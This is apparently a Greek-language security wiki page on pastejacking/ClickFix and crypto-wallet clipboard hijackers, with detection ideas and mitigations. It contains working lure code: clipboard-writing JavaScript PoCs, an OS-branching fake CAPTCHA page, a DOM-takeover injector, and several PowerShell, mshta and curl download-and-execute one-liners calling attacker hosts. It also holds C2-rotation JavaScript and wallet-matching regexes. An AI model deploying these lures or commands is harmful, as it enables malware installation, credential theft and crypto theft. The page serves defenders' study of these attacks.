# Επιθέσεις Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> «Μην επικολλάτε ποτέ κάτι που δεν αντιγράψατε οι ίδιοι.» – παλιά αλλά ακόμη έγκυρη συμβουλή

## Επισκόπηση

Το clipboard hijacking – γνωστό και ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες αντιγράφουν και επικολλούν τακτικά εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη ιστοσελίδα (ή οποιοδήποτε περιβάλλον που υποστηρίζει JavaScript, όπως μια εφαρμογή Electron ή Desktop) τοποθετεί μέσω προγραμματισμού κείμενο που ελέγχεται από τον attacker στο system clipboard. Τα θύματα παρακινούνται, συνήθως μέσω προσεκτικά σχεδιασμένων οδηγιών social engineering, να πατήσουν **Win + R** (παράθυρο διαλόγου Run), **Win + X** (Quick Access / PowerShell) ή να ανοίξουν ένα terminal και να *επικολλήσουν* το περιεχόμενο του clipboard, εκτελώντας αμέσως αυθαίρετες εντολές.

Επειδή **δεν γίνεται λήψη αρχείου και δεν ανοίγεται συνημμένο**, η τεχνική παρακάμπτει τα περισσότερα μέτρα ασφαλείας για email και web content που παρακολουθούν συνημμένα, macros ή άμεση εκτέλεση εντολών. Έτσι, η επίθεση είναι δημοφιλής σε phishing campaigns που διανέμουν commodity malware families όπως τα NetSupport RAT, Latrodectus loader ή Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper αντικατάστασης διευθύνσεων wallet

Μια άλλη παραλλαγή του **clipboard hijacking** δεν επικολλά καθόλου εντολές: περιμένει μέχρι το θύμα να αντιγράψει μια **διεύθυνση cryptocurrency wallet** και, στη συνέχεια, την αντικαθιστά σιωπηρά με μια διεύθυνση που ελέγχει ο attacker, λίγο πριν από την επικόλληση. Αυτό είναι ιδιαίτερα αποτελεσματικό με μεγάλες μορφές διευθύνσεων wallet, επειδή οι χρήστες συχνά ελέγχουν μόνο τους πρώτους/τελευταίους χαρακτήρες.<sup>[[8]](#references)</sup>

Συνηθισμένα χαρακτηριστικά σε πραγματικές επιθέσεις:
- **Ελαφρύς loader + εμφωλευμένο payload**: η ορατή εφαρμογή/exe φαίνεται να είναι ένα νόμιμο εργαλείο trading ή «κέρδους», ενώ το πραγματικό clipper είναι κρυμμένο βαθύτερα στο bundle (για παράδειγμα, ένας .NET loader εκκινεί ένα εμφωλευμένο Rust payload).
- **Αντικατάσταση βάσει regex**: το malware εντοπίζει συμβολοσειρές όπως `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ή ακόμη και γενικές συμβολοσειρές **44 χαρακτήρων τύπου Solana** και τις αντικαθιστά με διευθύνσεις wallet του attacker.
- **Εναλλαγή wallet σε μεγάλη κλίμακα**: σύγχρονα δείγματα Windows μπορεί να περιέχουν **χιλιάδες** διευθύνσεις αντικατάστασης ανά νόμισμα, αντί για μία στατική διεύθυνση, περιορίζοντας τη φθορά της φήμης του wallet μετά από κάθε κλοπή.<sup>[[8]](#references)</sup>

### Ροή λειτουργίας Windows clipper

Μια συνηθισμένη υλοποίηση είναι ένα κρυφό παράθυρο που καταχωρίζεται με το **`AddClipboardFormatListener`**. Σε κάθε ενημέρωση του clipboard, το malware συνήθως καλεί:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → πρόσβαση στα τρέχοντα δεδομένα του clipboard.
- **`GetClipboardData`** → ανάγνωση κειμένου.
- **`EmptyClipboard`** + **`SetClipboardData`** → αντικατάσταση της συμβολοσειράς wallet με την τιμή του attacker.

Ελάχιστα regex για αναζήτηση που συναντώνται συχνά σε clippers:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Η persistence σε επίπεδο χρήστη αρκεί για να έχει αντίκτυπο. Ένα μοτίβο που έχει παρατηρηθεί είναι:<sup>[[8]](#references)</sup>
- Αντιγραφή του payload στο **`%APPDATA%\silke\silke.exe`**
- Δημιουργία ενός **LNK στον φάκελο Startup** στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ιδέες για εντοπισμό:
- Διεργασίες που καλούν συνεχώς clipboard APIs, ενώ παράλληλα γράφουν κάτω από το `%APPDATA%` και στον φάκελο **Startup** του χρήστη.
- Δημιουργία νέου LNK/εκτελέσιμου αρχείου, ακολουθούμενη από αλλαγές στις διευθύνσεις wallet που βρίσκονται στο clipboard.
- Αρχεία ή πακέτα ψεύτικου λογισμικού που περιέχουν πολλά αχρησιμοποίητα αρχεία και έναν μικρό launcher που εκκινεί ένα εμφωλευμένο binary.

### Αφαίρεση quarantine μέσω social engineering στο macOS + persistence με LaunchAgent

Στο macOS, ορισμένες καμπάνιες διανέμουν ένα βοηθητικό αρχείο **`unlocker.command`** και καθοδηγούν το θύμα να κάνει δεξί κλικ → **Open**, αν το Gatekeeper αναφέρει ότι η εφαρμογή είναι κατεστραμμένη ή προέρχεται από μη αναγνωρισμένο developer. Το script απλώς αφαιρεί το quarantine και εκκινεί το κοντινό `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Αυτό **δεν** είναι exploit του Gatekeeper· είναι μια **παράκαμψη quarantine μέσω social engineering** που εκμεταλλεύεται το γεγονός ότι οι αποφάσεις του Gatekeeper εξαρτώνται από το xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Μετά την εκτέλεση, το clipper μπορεί να παραμείνει ενεργό για τον τρέχοντα χρήστη δημιουργώντας τα εξής αρχεία:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent με `RunAtLoad` και `KeepAlive`

Μια χρήσιμη αμυντική λεπτομέρεια είναι ότι ορισμένα δείγματα υλοποιούν ένα **self-healing watchdog** που ξαναγράφει το LaunchAgent και το wrapper περίπου κάθε 30 δευτερόλεπτα. Αν αφαιρέσετε πρώτα το plist **χωρίς να τερματίσετε τη διεργασία που εκτελείται**, το malware μπορεί να το δημιουργήσει ξανά αμέσως.<sup>[[8]](#references)</sup> Ασφαλής σειρά καθαρισμού:
1. Τερματίστε την ενεργή διεργασία του clipper.
2. Κάντε unload/διαγράψτε το plist του LaunchAgent.
3. Διαγράψτε το `~/launch.sh` και το αντιγραμμένο payload.

### Σημείωση για τη διανομή: η ψεύτικη φήμη ως πολλαπλασιαστής ισχύος

Για αυτή την οικογένεια malware, το ίδιο το malware μπορεί να παραμένει τεχνικά απλό, ενώ το **επίπεδο διανομής** αναλαμβάνει το μεγαλύτερο μέρος της δουλειάς: ψεύτικα stars/forks στο GitHub, κριτικές/downloads στο SourceForge, σχόλια/προβολές σε YouTube tutorials και ακίνδυνα φαινομενικά σχόλια/ψήφοι στο VirusTotal χρησιμοποιούνται για να κάνουν το binary να φαίνεται αξιόπιστο πριν από την εκτέλεσή του.<sup>[[8]](#references)</sup>

## Κουμπιά αντιγραφής με εξαναγκασμένη χρήση και κρυφά payloads (macOS one-liners)

Ορισμένα macOS infostealers κλωνοποιούν ιστότοπους εγκατάστασης (π.χ., Homebrew) και **εξαναγκάζουν τη χρήση ενός κουμπιού “Copy”**, ώστε οι χρήστες να μην μπορούν να επιλέξουν μόνο το ορατό κείμενο. Η καταχώριση στο clipboard περιέχει την αναμενόμενη εντολή εγκατάστασης μαζί με ένα επιπρόσθετο Base64 payload (π.χ., `...; echo <b64> | base64 -d | sh`), οπότε μία επικόλληση εκτελεί και τα δύο, ενώ το UI αποκρύπτει το επιπλέον στάδιο.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Παλαιότερες καμπάνιες χρησιμοποιούσαν το `document.execCommand('copy')`, ενώ οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Η ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται έναν ιστότοπο με τυποπαραποιημένο domain ή έναν παραβιασμένο ιστότοπο (π.χ. `docusign.sa[.]com`)
2. Το injected **ClearFake** JavaScript καλεί μια βοηθητική συνάρτηση `unsecuredCopyToClipboard()` που αποθηκεύει κρυφά στο clipboard μια one-liner PowerShell κωδικοποιημένη σε Base64.
3. Οι οδηγίες HTML λένε στο θύμα: *«Πατήστε **Win + R**, επικολλήστε την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.»*
4. Το `powershell.exe` εκτελείται και κατεβάζει ένα αρχείο archive που περιέχει ένα νόμιμο εκτελέσιμο αρχείο και ένα κακόβουλο DLL (κλασικό DLL sideloading).
5. Ο loader αποκρυπτογραφεί πρόσθετα στάδια, κάνει inject shellcode και εγκαθιστά persistence (π.χ. scheduled task), με τελικό αποτέλεσμα την εκτέλεση του NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Παράδειγμα αλυσίδας NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* Το `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά το `msvcp140.dll` στον κατάλογό του.
* Το κακόβουλο DLL επιλύει δυναμικά APIs με το **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω του **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα κυλιόμενο κλειδί XOR `"https://google.com/"`, κάνει inject το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Κατεβάζει το `la.txt` με το **curl.exe**
2. Εκτελεί το JScript downloader μέσα από το **cscript.exe**
3. Ανακτά ένα MSI payload → τοποθετεί το `libcef.dll` δίπλα σε μια υπογεγραμμένη εφαρμογή → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer μέσω MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Η κλήση **mshta** εκκινεί ένα κρυφό script PowerShell που ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανασυνθέτει το `AutoIt3.exe` μέσω `extrac32` και συνένωσης αρχείων και, τέλος, εκτελεί ένα script `.a3x` που κάνει exfiltration των διαπιστευτηρίων του browser στο `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Πρόχειρο → PowerShell → JS eval → Startup LNK με εναλλασσόμενο C2 (PureHVNC)

Ορισμένες καμπάνιες ClickFix παραλείπουν εντελώς τις λήψεις αρχείων και αντ’ αυτού καθοδηγούν τα θύματα να επικολλήσουν μια εντολή μίας γραμμής, η οποία ανακτά και εκτελεί JavaScript μέσω WSH, διατηρεί την πρόσβαση και αλλάζει C2 καθημερινά. Παράδειγμα αλυσίδας που παρατηρήθηκε:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Βασικά χαρακτηριστικά
- Το URL είναι obfuscated και αντιστρέφεται κατά την εκτέλεση για να αποτρέψει την επιφανειακή επιθεώρηση.
- Το JavaScript διατηρείται μέσω ενός Startup LNK (WScript/CScript) και επιλέγει το C2 με βάση την τρέχουσα ημέρα, επιτρέποντας γρήγορο domain rotation.<sup>[[3]](#references)</sup>

Ελάχιστο απόσπασμα JS που χρησιμοποιείται για την εναλλαγή C2 ανά ημερομηνία:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που εγκαθιστά persistence και κατεβάζει ένα RAT (π.χ. PureHVNC), συχνά καρφιτσώνοντας το TLS σε ένα hardcoded certificate και τεμαχίζοντας την κίνηση.<sup>[[3]](#references)</sup>

Ιδέες ανίχνευσης ειδικά για αυτήν την παραλλαγή
- Δέντρο διεργασιών: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ή `cscript.exe`).
- Artifacts εκκίνησης: LNK στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` που εκτελεί το WScript/CScript με διαδρομή JS κάτω από το `%TEMP%`/`%APPDATA%`.
- Τηλεμετρία μητρώου/RunMRU και γραμμής εντολών που περιέχει `.split('').reverse().join('')` ή `eval(a.responseText)`.
- Επαναλαμβανόμενη χρήση του `powershell -NoProfile -NonInteractive -Command -` με μεγάλα payloads στο stdin, ώστε να εκτελούνται μεγάλα scripts χωρίς μεγάλες γραμμές εντολών.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins, όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, μέσω εργασίας/διαδρομής που μοιάζει με updater (π.χ., `\GoogleSystem\GoogleUpdater`).

Κυνήγι απειλών
- Hostnames C2 και URL που εναλλάσσονται καθημερινά, με μοτίβο `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχετίστε συμβάντα εγγραφής στο clipboard, που ακολουθούνται από επικόλληση μέσω Win+R και άμεση εκτέλεση του `powershell.exe`.

Οι ομάδες Blue Team μπορούν να συνδυάσουν τηλεμετρία clipboard, δημιουργίας διεργασιών και μητρώου, για να εντοπίσουν κατάχρηση pastejacking:

* Μητρώο Windows: το `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` διατηρεί ιστορικό των εντολών **Win + R** – αναζητήστε ασυνήθιστες καταχωρίσεις Base64 / obfuscated.
* Security Event ID **4688** (Δημιουργία διεργασίας), όπου `ParentImage` == `explorer.exe` και `NewProcessName` είναι ένα από τα { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από το `%LocalAppData%\Microsoft\Windows\WinX\` ή σε προσωρινούς φακέλους, ακριβώς πριν από το ύποπτο συμβάν 4688.
* Αισθητήρες clipboard EDR (αν υπάρχουν) – συσχετίστε την εγγραφή `Clipboard Write` με άμεση εκκίνηση μιας νέας διεργασίας PowerShell.

## Σελίδες επαλήθευσης τύπου IUAM (ClickFix Generator): αντιγραφή από το clipboard στην κονσόλα + payloads προσαρμοσμένα στο OS

Πρόσφατες καμπάνιες δημιουργούν μαζικά ψεύτικες σελίδες επαλήθευσης CDN/browser («Just a moment…», τύπου IUAM), που εξαναγκάζουν τους χρήστες να αντιγράφουν εντολές ειδικές για το OS από το clipboard και να τις επικολλούν σε εγγενείς κονσόλες. Έτσι, η εκτέλεση μεταφέρεται εκτός του sandbox του browser και λειτουργεί σε Windows και macOS.<sup>[[4]](#references)</sup>

Βασικά χαρακτηριστικά των σελίδων που δημιουργούνται από τον builder
- Ανίχνευση OS μέσω `navigator.userAgent` για προσαρμογή των payloads (Windows PowerShell/CMD έναντι macOS Terminal). Προαιρετικά decoys/no-ops για μη υποστηριζόμενα OS, ώστε να διατηρείται η ψευδαίσθηση.
- Αυτόματη αντιγραφή στο clipboard μετά από αθώες ενέργειες UI (checkbox/Copy), ενώ το ορατό κείμενο μπορεί να διαφέρει από το περιεχόμενο του clipboard.
- Αποκλεισμός κινητών και popover με αναλυτικές οδηγίες: Windows → Win+R→επικόλληση→Enter· macOS → άνοιγμα Terminal→επικόλληση→Enter.
- Προαιρετικό obfuscation και injector ενός αρχείου για την αντικατάσταση του DOM ενός παραβιασμένου ιστότοπου με UI επαλήθευσης διαμορφωμένο με Tailwind (δεν απαιτείται καταχώριση νέου domain).<sup>[[4]](#references)</sup>

Παράδειγμα: ασυμφωνία clipboard + διακλάδωση ανάλογα με το OS
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS persistence της αρχικής εκτέλεσης
- Χρησιμοποιήστε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχίζεται μετά το κλείσιμο του terminal, μειώνοντας τα ορατά ίχνη.<sup>[[4]](#references)</sup>

Επιτόπια κατάληψη σελίδας σε παραβιασμένους ιστότοπους
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Ιδέες για εντοπισμό και threat hunting ειδικά για IUAM-style lures
- Web: Σελίδες που συνδέουν το Clipboard API με widgets επαλήθευσης· ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του payload του clipboard· διακλάδωση βάσει του `navigator.userAgent`· Tailwind + single-page replace σε ύποπτα περιβάλλοντα.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από αλληλεπίδραση με browser· εκτέλεση batch/MSI installers από το `%TEMP%`.
- macOS endpoint: Το Terminal/iTerm εκκινεί `bash`/`curl`/`base64 -d` με `nohup` κοντά σε συμβάντα browser· background jobs που συνεχίζουν να εκτελούνται μετά το κλείσιμο του terminal.
- Συσχετίστε το ιστορικό `RunMRU` Win+R και τις εγγραφές στο clipboard με την επακόλουθη δημιουργία διεργασιών κονσόλας.

Δείτε επίσης για υποστηρικτικές τεχνικές

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Εξελίξεις fake CAPTCHA / ClickFix το 2026 (ClearFake, Scarlet Goldfinch)

- Το ClearFake συνεχίζει να θέτει σε κίνδυνο ιστότοπους WordPress και να εισάγει loader JavaScript που αλυσιδώνει εξωτερικούς hosts (Cloudflare Workers, GitHub/jsDelivr) και ακόμη και κλήσεις blockchain «etherhiding» (π.χ. POST προς endpoints του Binance Smart Chain API όπως το `bsc-testnet.drpc[.]org`) για να ανακτήσει την τρέχουσα λογική των lures. Πρόσφατα overlays βασίζονται εκτενώς σε fake CAPTCHA που καθοδηγούν τους χρήστες να αντιγράψουν/επικολλήσουν μία γραμμή εντολών (T1204.004), αντί να κατεβάσουν οτιδήποτε.<sup>[[6]](#references)</sup>
- Η αρχική εκτέλεση ανατίθεται όλο και περισσότερο σε υπογεγραμμένους script hosts/LOLBAS. Οι αλυσίδες του Ιανουαρίου 2026 αντικατέστησαν την προηγούμενη χρήση του `mshta` με το ενσωματωμένο `SyncAppvPublishingServer.vbs`, το οποίο εκτελείται μέσω του `WScript.exe` και δέχεται ορίσματα τύπου PowerShell με aliases/wildcards για την ανάκτηση απομακρυσμένου περιεχομένου:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - Το `SyncAppvPublishingServer.vbs` είναι υπογεγραμμένο και χρησιμοποιείται συνήθως από το App-V· σε συνδυασμό με το `WScript.exe` και ασυνήθιστα ορίσματα (aliases `gal`/`gcm`, cmdlets με wildcards, URLs του jsDelivr) γίνεται ένα στάδιο LOLBAS με υψηλή ένδειξη για το ClearFake.<sup>[[6]](#references)</sup>
- Τον Φεβρουάριο του 2026, τα payloads ψεύτικου CAPTCHA επέστρεψαν σε καθαρά PowerShell download cradles. Δύο ενεργά παραδείγματα:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Η πρώτη αλυσίδα είναι ένα grabber `iex(irm ...)` που εκτελείται στη μνήμη· η δεύτερη χρησιμοποιεί το `WinHttp.WinHttpRequest.5.1`, γράφει ένα προσωρινό `.ps1` και έπειτα το εκκινεί με `-ep bypass` σε κρυφό παράθυρο.<sup>[[6]](#references)</sup>

Συμβουλές ανίχνευσης/αναζήτησης για αυτές τις παραλλαγές
- Αλυσίδα διεργασιών: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ή PowerShell cradles αμέσως μετά από εγγραφές στο clipboard/Win+R.
- Λέξεις-κλειδιά στη γραμμή εντολών: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domains jsDelivr/GitHub/Cloudflare Worker ή μοτίβα raw IP `iex(irm ...)`.
- Δίκτυο: εξερχόμενη κίνηση προς hosts CDN worker ή blockchain RPC endpoints από script hosts/PowerShell, λίγο μετά την περιήγηση στον ιστό.
- Αρχεία/registry: δημιουργία προσωρινού `.ps1` κάτω από το `%TEMP%`, μαζί με εγγραφές RunMRU που περιέχουν αυτές τις one-liners· αποκλεισμός/ειδοποίηση για signed-script LOLBAS (WScript/cscript/mshta) που εκτελούνται με εξωτερικά URLs ή συγκαλυμμένες συμβολοσειρές alias.

## Τακτικές ClickFix του Ιουνίου 2026: telemetry επικόλλησης, πλαστά σχόλια επαλήθευσης και αλυσιδωτή χρήση LOLBin

Πρόσφατα telemetry της Red Canary δείχνουν ότι ο σταθερός δείκτης **δεν είναι μία συγκεκριμένη εντολή**, αλλά ο συνδυασμός **επικόλλησης και εκτέλεσης με τη βοήθεια του χρήστη**, **έμπιστων interpreters/LOLBins**, **συγκαλυμμένων flags**, **απομακρυσμένης ανάκτησης** και **άμεσης εκτέλεσης**.<sup>[[7]](#references)</sup>

### Αξιοσημείωτα μοτίβα χειριστών

- **Telemetry επιβεβαίωσης επικόλλησης**: ορισμένα payloads εκτελούν `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` πριν από το πραγματικό stage. Αυτό επιβεβαιώνει την αλληλεπίδραση του χρήστη, διατηρώντας το παράθυρο σύντομο και διακριτικό.
- **Πλαστά σχόλια επαλήθευσης**: PowerShell one-liners μπορεί να προσθέτουν συμβολοσειρές όπως `# Security check ✔️ I'm not a robot Verification ID: 138105`, ώστε η εντολή να εξακολουθεί να μοιάζει σχετική με CAPTCHA αφού επικολληθεί στο Run / `cmd.exe` / ιστορικό PowerShell.
- **Δυναμική ανασύνθεση URL**: το `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` αποφεύγει ένα στατικό URL στη γραμμή εντολών, ενώ εξακολουθεί να εκτελεί λήψη και εκτέλεση στη μνήμη.
- **Εκτέλεση μεταμφιεσμένου installer**: το `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` καταχράται ασυνήθιστη χρήση κεφαλαίων και χαρακτήρες τύπου Unicode στα flags, παρακάμπτοντας εύθραυστες ανιχνεύσεις, ενώ εξακολουθεί να μοιάζει με `msiexec.exe`.
- **Αλυσίδες LOLBin με διαφυγές caret**: το `cmd.exe` μπορεί να κρύβει λέξεις-κλειδιά με διαφυγές `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), να εκκινεί το ένθετο shell σε ελαχιστοποιημένη κατάσταση, να αποθηκεύει περιεχόμενο του εισβολέα με αθώα επέκταση όπως `.pdf` και έπειτα να το εκτελεί μέσω `mshta`.<sup>[[7]](#references)</sup>
## Μετριασμός

1. Ενίσχυση browser – απενεργοποίηση της πρόσβασης εγγραφής στο clipboard (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαίτηση χειρονομίας από τον χρήστη.
2. Ευαισθητοποίηση σε θέματα ασφάλειας – διδάξτε τους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε έναν επεξεργαστή κειμένου.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για αποκλεισμό αυθαίρετων one-liners.
4. Έλεγχοι δικτύου – αποκλεισμός εξερχόμενων αιτημάτων προς γνωστά domains pastejacking και malware C2.

## Σχετικά κόλπα

* Το **Discord Invite Hijacking** συχνά καταχράται την ίδια προσέγγιση ClickFix, αφού προσελκύσει τους χρήστες σε έναν κακόβουλο server:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Διόρθωση του Click: Πρόληψη του διανύσματος επίθεσης ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Πίσω από την καθαρή κουρτίνα: Από RAT σε Builder και σε Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Το εργοστάσιο ClickFix: Πρώτη αποκάλυψη της γεννήτριας IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, η χρονιά του Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Ενημερώσεις πληροφοριών: Φεβρουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Ενημερώσεις πληροφοριών: Ιούνιος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Από αστέρια σε θετικές ψήφους: Ψεύτικη φήμη που τροφοδοτεί έναν crypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
